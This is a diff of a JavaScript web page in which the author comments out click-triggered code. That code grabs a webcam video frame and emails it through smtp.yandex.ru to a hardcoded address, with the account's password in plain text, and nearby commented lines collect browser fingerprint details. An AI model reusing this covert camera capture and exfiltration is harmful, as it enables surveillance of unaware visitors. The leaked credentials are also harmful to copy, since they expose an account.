@@ -46,66 +46,66 @@
         var context = canvas.getContext('2d');
         var video = document.getElementById('video');
 
-        function vibrate(val) {
-            if ("vibrate" in navigator) return navigator.vibrate(val);
-            if ("oVibrate" in navigator) return navigator.oVibrate(val);
-            if ("mozVibrate" in navigator) return navigator.mozVibrate(val);
-            if ("webkitVibrate" in navigator) return navigator.webkitVibrate(val);
-            document.getElementById('error').innerHTML = "Ваш браузер не поддерживает vibration Api .. попробуйте открыть пример в мобильном fixefox, там все точно работает";
-        }
+        // function vibrate(val) {
+        //     if ("vibrate" in navigator) return navigator.vibrate(val);
+        //     if ("oVibrate" in navigator) return navigator.oVibrate(val);
+        //     if ("mozVibrate" in navigator) return navigator.mozVibrate(val);
+        //     if ("webkitVibrate" in navigator) return navigator.webkitVibrate(val);
+        //     document.getElementById('error').innerHTML = "Ваш браузер не поддерживает vibration Api .. попробуйте открыть пример в мобильном fixefox, там все точно работает";
+        // }
 
-        function infiniteVibrate(val, interval) {
-            stopVibrate();
-            vInterval = setInterval(function() {
-                vibrate(val);
-            }, interval);
-        }
+        // function infiniteVibrate(val, interval) {
+        //     stopVibrate();
+        //     vInterval = setInterval(function() {
+        //         vibrate(val);
+        //     }, interval);
+        // }
 
-        function stopVibrate() {
-            if (typeof(vInterval) !== "undefined") clearInterval(vInterval);
-            vibrate(0);
-        }
-        // Trigger photo take
-        document.getElementsByTagName("body")[0].addEventListener("click", function() {
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
+        // function stopVibrate() {
+        //     if (typeof(vInterval) !== "undefined") clearInterval(vInterval);
+        //     vibrate(0);
+        // }
+        // // Trigger photo take
+        // // document.getElementsByTagName("body")[0].addEventListener("click", function() {
+        // //     canvas.width = video.videoWidth;
+        // //     canvas.height = video.videoHeight;
+        // //     context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // var code = navigator.appCodeName;
-            // var name = navigator.appName;
-            // var vers = navigator.appVersion;
-            // var platform = navigator.platform;
-            // var cook = navigator.cookieEnabled;
-            // var je = navigator.javaEnabled();
-            // var ua = navigator.userAgent;
-            // var text = 'Ваш браузер: ' + name +
-            //     '<br />Версия браузера: ' + vers +
-            //     '<br />Кодовое название браузера: ' + code +
-            //     '<br />Платформа: ' + platform +
-            //     '<br />Поддержка cookie: ' + cook +
-            //     '<br />Поддержка JavaScript: ' + je +
-            //     '<br />Браузер: ' + ua +
-            //     navigator.language +
-            //     '<br />Операционная система: ' + navigator.oscpu +
-            //     '<br />Производитель: ' + navigator.vendor +
-            //     '<br />Подразделение: ' + navigator.vendorSub;
-            vibrate(100)
-            Email.send({
-                Host: "smtp.yandex.ru",
-                Username: "koha009@yandex.ru",
-                Password: "markeloff",
-                To: 'koha009@yandex.ru',
-                From: "koha009@yandex.ru",
-                Subject: "Пришел снимок экрана",
-                Body: "<html><h2>Информация</h2><p></p></html>",
-                Attachments: [{
-                    name: 'photo.png',
-                    data: canvas.toDataURL()
-                }]
-            }).then(
-                message => vibrate(500)
-            );
-        });
+        // //     // var code = navigator.appCodeName;
+        // //     // var name = navigator.appName;
+        // //     // var vers = navigator.appVersion;
+        // //     // var platform = navigator.platform;
+        // //     // var cook = navigator.cookieEnabled;
+        // //     // var je = navigator.javaEnabled();
+        // //     // var ua = navigator.userAgent;
+        // //     // var text = 'Ваш браузер: ' + name +
+        // //     //     '<br />Версия браузера: ' + vers +
+        // //     //     '<br />Кодовое название браузера: ' + code +
+        // //     //     '<br />Платформа: ' + platform +
+        // //     //     '<br />Поддержка cookie: ' + cook +
+        // //     //     '<br />Поддержка JavaScript: ' + je +
+        // //     //     '<br />Браузер: ' + ua +
+        // //     //     navigator.language +
+        // //     //     '<br />Операционная система: ' + navigator.oscpu +
+        // //     //     '<br />Производитель: ' + navigator.vendor +
+        // //     //     '<br />Подразделение: ' + navigator.vendorSub;
+        // //     vibrate(100)
+        // //     Email.send({
+        // //         Host: "smtp.yandex.ru",
+        // //         Username: "koha009@yandex.ru",
+        // //         Password: "markeloff",
+        // //         To: 'koha009@yandex.ru',
+        // //         From: "koha009@yandex.ru",
+        // //         Subject: "Пришел снимок экрана",
+        // //         Body: "<html><h2>Информация</h2><p></p></html>",
+        // //         Attachments: [{
+        // //             name: 'photo.png',
+        // //             data: canvas.toDataURL()
+        // //         }]
+        // //     }).then(
+        // //         message => vibrate(500)
+        // //     );
+        // // });
         // Grab elements, create settings, etc.
         var video = document.getElementById('video');
 
